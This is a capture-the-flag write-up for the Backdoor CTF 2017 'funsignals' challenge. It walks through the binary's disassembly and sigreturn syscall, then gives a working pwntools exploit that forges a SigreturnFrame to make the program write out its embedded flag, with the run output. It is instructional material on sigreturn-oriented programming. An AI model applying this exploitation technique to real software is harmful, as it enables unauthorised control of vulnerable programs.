# backdoor ctf 2017 funsignals

This writeup is based off of: https://www.akashtrehan.com/writeups/backdoorctf17/2funsignals/

Let's take a look at the binary:
```
$	pwn checksec funsignals_player_bin 
[*] '/home/guyinatuxedo/Desktop/bd/fun/funsignals_player_bin'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000000)
    RWX:      Has RWX segments
$	file funsignals_player_bin 
funsignals_player_bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
$	./funsignals_player_bin 
15935728
Segmentation fault (core dumped)
```

So we can see we are dealing with a `64` bit binary with no binary protections. Starting off, the code for this binary is really small. It only has three sections of code. Looking at the `__start` section we see two syscalls being made:

```
.shellcode:0000000010000000 _start:                                 ; Alternative name is '_start'
.shellcode:0000000010000000                 xor     eax, eax        ; __start
.shellcode:0000000010000002                 xor     edi, edi
.shellcode:0000000010000004                 xor     edx, edx
.shellcode:0000000010000006                 mov     dh, 4
.shellcode:0000000010000008                 mov     rsi, rsp
.shellcode:000000001000000B                 syscall
.shellcode:000000001000000D                 xor     edi, edi
.shellcode:000000001000000F                 push    0Fh
.shellcode:0000000010000011                 pop     rax
.shellcode:0000000010000012                 syscall
.shellcode:0000000010000014                 int     3               ; Trap to Debugger
.shellcode:0000000010000015
.shellcode:0000000010000015 syscall:
.shellcode:0000000010000015                 syscall
.shellcode:0000000010000017                 xor     rdi, rdi
.shellcode:000000001000001A                 mov     rax, 3Ch
.shellcode:0000000010000021                 syscall
```

The first syscall that is being made is for `read(stdin, $esp, 0x400)`:

```
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x400             
$rsp   : 0x00007fffffffdef0  →  0x0000000000000001
$rbp   : 0x0               
$rsi   : 0x00007fffffffdef0  →  0x0000000000000001
$rdi   : 0x0               
$rip   : 0x000000001000000b  →  <_start+11> syscall 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x0               
$r12   : 0x0               
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdef0│+0x0000: 0x0000000000000001	 ← $rsp, $rsi
0x00007fffffffdef8│+0x0008: 0x00007fffffffe25f  →  "/home/guyinatuxedo/Desktop/bd/fun/funsignals_playe[...]"
0x00007fffffffdf00│+0x0010: 0x0000000000000000
0x00007fffffffdf08│+0x0018: 0x00007fffffffe297  →  "XDG_VTNR=7"
0x00007fffffffdf10│+0x0020: 0x00007fffffffe2a2  →  "XDG_SESSION_ID=c2"
0x00007fffffffdf18│+0x0028: 0x00007fffffffe2b4  →  "XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/guyinat[...]"
0x00007fffffffdf20│+0x0030: 0x00007fffffffe2ec  →  "CLUTTER_IM_MODULE=xim"
0x00007fffffffdf28│+0x0038: 0x00007fffffffe302  →  "GPG_AGENT_INFO=/home/guyinatuxedo/.gnupg/S.gpg-age[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 → 0x1000000b <_start+11>      syscall 
   0x1000000d <_start+13>      xor    edi, edi
   0x1000000f <_start+15>      push   0xf
   0x10000011 <_start+17>      pop    rax
   0x10000012 <_start+18>      syscall 
   0x10000014 <_start+20>      int3   
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "funsignals_play", stopped, reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x1000000b → _start()
─────────────────────────────────────────────────────────────────────────────────────────────────────
```

It xors `eax`,  `edi`, abd `edx` by itself to set them equal to `0` (which also sets `rax` and `rdi` equal to zero in this case). A `0` in the `rax` register specifies a read syscall, and a `0` in the `rdi` sepcifies scanning in data through `stdin`. It then moves the value `0x4` into the `dh` register, which is the upper two bytes of the edx register, which sets `rdx` equal to `0x400`. After that it moves the value in the `rsp` register into the `rsi` register, so we will be writing directly to the stack frame (since `rsp` wasn't adjusted at all to make space for variables). After that the read syscall is made (checkout `http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/` for more details).

After the read syscall, a sigreturn syscall is made. When the kernel delivers a signal from a program, it creates a frame on the stack before it is passed to the signal handler. Then after that is done that frame is used as context for a `sigreturn` syscall to return code execution to where it was interrupted. The syscall itself takes a single argument in the `rdi` register, but it's not used. We can tell that a sigreturn syscall is being made since it pops the value `0xf` into the `rax` register before making the syscall to sepcify a sigreturn syscall. Checkout https://lwn.net/Articles/676803/ and https://thisissecurity.stormshield.com/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/ for more. 

Now it's just the question of where to jump with the sigreturn. There are three different syscalls each with a static address (`0x1000000b`, `0x10000015`, and `0x10000021`). We can just jump to any of them, and have a syscall where we control the registers (we will jump by setting the `rip` register equal to the address we are jumping to). Now for what to do. Looking in the binary, we can see that on the server the flag will be hard coded into the binary at a static address:

```
.shellcode:0000000010000023 flag            db 'fake_flag_here_as_original_is_at_server',0
.shellcode:0000000010000023 _shellcode      ends
```

As a result of that we can just do a write call to `stdout` with the address `0x10000023` (and as long as the size is big enough) we will get the flag. To setup the call, we will prep the registers like this:

```
Now for the sigreturn call, there are only five registers we care about
RIP:    Where we are jumping
RAX:    Specify the write syscall for after the jump
RDI:    Where will the output go (stdout)
RSI:    Where will we be writing from
RDX:    How much to write?

for that, we will
RIP:    0x10000021 (Syscall instruction, 0x10000015 and `0x1000000b will also work)
RAX:    0x4  specify write syscall, equal to SYS_write
RDI:    0x1 specify stdout, equal to STDOUT_FILENO
RSI:    0x10000023 address of flag, which we will be printing out
RDX:    0x100 to specify write 0x100 bytes
```

Putting it all together, we get the following exploit:
```
# This exploit is from: https://www.akashtrehan.com/writeups/backdoorctf17/2funsignals/

from pwn import *

# Establish the target
target = process("./funsignals_player_bin")
elf = ELF('funsignals_player_bin')

# Establish what architecture this is
context.arch = "amd64"

'''
Now for the sigreturn call, there are only five registers we care about
RIP:  Where we are jumping
RAX:  Specify the write syscall for after the jump
RDI:  Where will the output go (stdout)
RSI:  Where will we be writing from
RDX:  How much to write?

for that, we will
RIP:  0x10000021 (Syscall instruction, 0x10000015 and `0x1000000b will also work)
RAX:  0x4  specify write syscall, equal to SYS_write
RDI:  0x1 specify stdout, equal to STDOUT_FILENO
RSI:  0x10000023 address of flag, which we will be printing out
RDX:  0x100 to specify write 0x100 bytes
'''

# Create the stack frame
frame = SigreturnFrame()

frame.rip = 0x10000021

frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = elf.symbols['flag']
frame.rdx = 0x100

# Send the frame, then drop to an interactive shell to read the flag
target.send(str(frame))
target.interactive()
```

and when we run it:
```
$ python exploit.py 
[+] Starting local process './funsignals_player_bin': pid 2448
[*] '/home/guyinatuxedo/Desktop/bd/fun/funsignals_player_bin'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000000)
    RWX:      Has RWX segments
[*] Switching to interactive mode
fake_flag_here_as_original_is_at_server\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00��\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00\x00\x00\x00\x15\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00#\x00\x00\x00\x00\x00\x00#\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x10\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00)\x00\x00\x00\x10\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x10\x00��@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<\x00\x00\x00\x10\x00��@\x00\x00\x00\x00\x00\[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Process './funsignals_player_bin' stopped with exit code -4 (SIGILL) (pid 2448)
```
